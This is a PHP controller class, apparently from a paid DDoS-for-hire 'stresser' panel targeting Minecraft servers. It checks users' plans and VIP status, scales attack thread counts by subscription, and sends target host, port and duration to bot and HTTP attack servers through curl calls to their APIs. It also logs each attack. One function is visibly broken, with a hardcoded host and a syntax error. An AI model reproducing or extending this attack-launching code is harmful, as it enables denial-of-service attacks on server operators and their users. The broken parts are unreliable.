<?php
namespace mcspam;
require_once($_SERVER['DOCUMENT_ROOT'] . '/' . '/inc/Database/Database.php');
USE PDO;

/**
 * Class attackController
 * @package mcspam
 */

Class attackController {
    private $host, $port, $time, $version, $end;
    private $pdo, $mysql;
    private $username;

    /**
     * @var array
     */
    private static $versions = [
        '477',
        '404',
        '401',
        '393',
        '340',
        '338',
        '335',
        '316',
        '315',
        '210',
        '110',
        '109',
        '108',
        '107',
        '47'
    ];

    /**
     * attackController constructor.
     */
    public function __construct() {
        $this->mysql = new Database();
        $this->pdo = $this->mysql->connect();
    }


    /**
     * @param $port
     * @param $time
     * @param $version
     * @return bool
     */
    private $vip;
    public function checkParameters ($port, $time, $version, $vip)
    {
        $this->port = $port;
        $this->time = $time;
        $this->version = $version;
        $this->vip = $vip;

        if (in_array($version, self::$versions)) {
            if (is_numeric($this->port) && is_numeric($this->time) && is_numeric($version) && is_numeric($this->vip)) {
                return true;
            }
            return false;
        }
        return false;
    }

    public function getVip() {
        $this->username = $_SESSION['username'];
        $mysql = $this->pdo->prepare('
        
            SELECT * FROM Users
              WHERE username = ?
        
        ');
        $mysql->bindValue(1, stripslashes(htmlspecialchars($this->username)), PDO::PARAM_STR);
        $mysql->execute();

        while ($data = $mysql->fetch(PDO::FETCH_ASSOC)) {
            $this->string = $data['plan'];

            $mysql = $this->pdo->prepare('
            
                SELECT vip FROM Plans
                  WHERE name = ?
            
            ');
            $mysql->bindValue(1, $this->string, PDO::PARAM_STR);
            $mysql->execute();

            if ($mysql->fetchColumn(0) === "1") {
                return true;
            } else {
                return false;
            }
        }
    }

    public function filterInput($input) {
        $this->host = "reet";
        if (!is_numeric($this-host) {
            return $this->host;
        } else {
            return false;
        }
    }

    public function isFree() {
        $this->username = $_SESSION['username'];
        $mysql = $this->pdo->prepare('
        
            SELECT plan FROM Users
              WHERE username = ?
            
        ');
        $mysql->bindValue(1, $this->username, PDO::PARAM_STR);
        $mysql->execute();

        if ($mysql->fetchColumn(0) === "No plan"){
            return true;
        } else {
            return false;
        }
    }

    private $max;
    public function maxAttacks() {
        $mysql = $this->pdo->prepare('
        
            SELECT * FROM Tests
              WHERE status = ?
        
        ');
        $mysql->bindValue(1, "Running", PDO::PARAM_STR);
        $mysql->execute();

        if ($mysql->rowCount() > 3) {
            return true;
        } else {
            return false;
        }
    }

    private $string;
    public function allowedAttack() {
        $this->username = $_SESSION['username'];
        $mysql = $this->pdo->prepare('
        
            SELECT * FROM Users
              WHERE username = ?
        
        ');
        $mysql->bindValue(1, $this->username, PDO::PARAM_STR);
        $mysql->execute();

        while ($data = $mysql->fetch(PDO::FETCH_ASSOC)) {
            $this->string = $data['plan'];
            if ($this->string === "No plan"){
                return false;
            } else {
                return true;
            }
        }
    }

    public function getAttack() {
        $this->username = $_SESSION['username'];
        $mysql = $this->pdo->prepare('
        
            SELECT plan FROM Users
                WHERE username = ?
        
        ');
        $mysql->bindValue(1, stripslashes(htmlspecialchars($this->username)), PDO::PARAM_STR);
        $mysql->execute();

        $fetch = $this->pdo->prepare('
            
           SELECT attack_time FROM Plans
              WHERE name = ?
            
        ');
        $fetch->bindValue(1, $mysql->fetchColumn(0), PDO::PARAM_STR);
        $fetch->execute();

        return $fetch->fetchColumn(0);
    }

    public function getConc() {
        $this->username = $_SESSION['username'];

        $mysql = $this->pdo->prepare('
        
            SELECT * FROM Tests
              WHERE username = ?
                AND status = ?
        
        ');
        $mysql->bindValue(1, $this->username, PDO::PARAM_STR);
        $mysql->bindValue(2, "Running", PDO::PARAM_STR);
        $mysql->execute();

        if ($mysql->rowCount() > 0) {
            return false;
        }
        return true;
    }

    /**
     * @param $host
     * @param $port
     * @param $time
     * @param $version
     * @return bool
     */

    public function logAttack($host, $port, $time, $version) {
        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->version = $version;
        $this->end = $end = strtotime("+{$this->time} Seconds");

        $mysql = $this->pdo->prepare('
        
            INSERT INTO Tests(target, port, time, version, end, username)
              VALUES(?, ?, ?, ?, ?, ?)
        
        ');
        $mysql->bindValue(1, $this->host, PDO::PARAM_STR);
        $mysql->bindValue(2, $this->port, PDO::PARAM_INT);
        $mysql->bindValue(3, $this->time, PDO::PARAM_INT);
        $mysql->bindValue(4, $this->version, PDO::PARAM_STR);
        $mysql->bindValue(5, $this->end, PDO::PARAM_STR);
        $mysql->bindValue(6, stripslashes(htmlspecialchars($_SESSION['username'])), PDO::PARAM_STR);
        $mysql->execute();

        return true;

    }
    /**
     * @param $host
     * @param $port
     * @param $time
     * @param $version
     * @return bool
     */

    public function sendHTTP($host, $time) {
        $this->host = $host;
        $this->time = $time;

        if ($this->host && $this->time) {

            $mysql = $this->pdo->prepare('
            
                SELECT * FROM Servers
                  WHERE type = ?
            
            ');
            $mysql->bindValue(1, "HTTP", PDO::PARAM_STR);
            $mysql->execute();

            while ($data = $mysql->fetch(PDO::FETCH_ASSOC)) {
                $this->server = $data['api'];
                if ($this->server) {

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $this->server."&target={$this->host}&time={$this->time}");
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_exec($ch);
                    curl_close($ch);

                }
            }
            self::logAttack($this->host, "80", $this->time, "HTTP");
            return true;
        } else {
            return false;
        }
    }

    public function isBlacklist($host) {
        $this->host = $host;

        if ($this->host) {
            $mysql = $this->pdo->prepare('
            
                SELECT * FROM Blacklists
                  WHERE host = ?
            
            ');
            $mysql->bindValue(1, $this->host, PDO::PARAM_STR);
            $mysql->execute();

            while ($data = $mysql->fetch(PDO::FETCH_ASSOC)) {
                $this->string = $data['host'];
                if ($this->string) {
                    return true;
                } else {
                    return false;
                }
            }
        }
    }

    private $threads, $mode, $server_id, $server;
    public function sendAttack($host, $port, $time, $version, $vip, $mode) {
        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->version = $version;
        $this->vip = $vip;
        $this->mode = $mode;

        if (self::checkParameters($this->port, $this->time, $this->version, $this->vip) === true) {
            if (self::isFree() == true)
            {
                $this->threads = "1500";
            }
            elseif (self::isFree() === false)
            {
                if ($vip === "1") {
                    $this->threads = "4500";
                } else {
                    $this->threads = "3500";
                }
            }

            if($this->mode === "1"){
                $type = "BOTH";
            } else {
                $type = "HTTP";
            }

            $mysql = $this->pdo->prepare('
            
                SELECT * FROM Servers
                  WHERE type = ?
                
            ');
            $mysql->bindValue(1, "BOT", PDO::PARAM_STR);
            $mysql->execute();

            while ($data = $mysql->fetch(PDO::FETCH_ASSOC)){
                $this->server = $data['api'];
                $this->server_id = $data['ID'];

                if ($this->server && $this->server_id) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL,$this->server."&target={$this->host}&port={$this->port}&time={$this->time}&version={$this->version}&threads={$this->threads}&mode=$type");
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_exec($ch);
                    curl_close($ch);
                } else {
                    return false;
                }
            }
            self::logAttack($this->host, $this->port, $this->time, $this->version);
            return true;
        }
        return false;
    }

//    public function stopAttack($host) {
//        $this->host = stripslashes(htmlspecialchars($host));
//        if ($this->host) {
//            $mysql = $this->pdo->prepare('
//
//                SELECT * FROM Servers
//
//            ');
//            $mysql->execute();
//            while ($data = $mysql->fetch(PDO::FETCH_ASSOC)) {
//                $this->server = $data['api'];
//                $ch = curl_init();
//                curl_setopt($ch, CURLOPT_URL, $data['api']."?stop=true&target={$this->host}");
//                curl_setopt($ch, CURLOPT_POST, 1);
//                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//                curl_exec($ch);
//                curl_close($ch);
//                return true;
//            }
//
//            $mysql = $this->pdo->prepare('
//
//                UPDATE Tests
//                    SET status = ?
//                      WHERE target = ?
//            ');
//            $mysql->bindValue(1, "Finished", PDO::PARAM_STR);
//            $mysql->bindValue(2, $this->host, PDO::PARAM_STR);
//            $mysql->execute();
//
//        }
//        return false;
//    }

}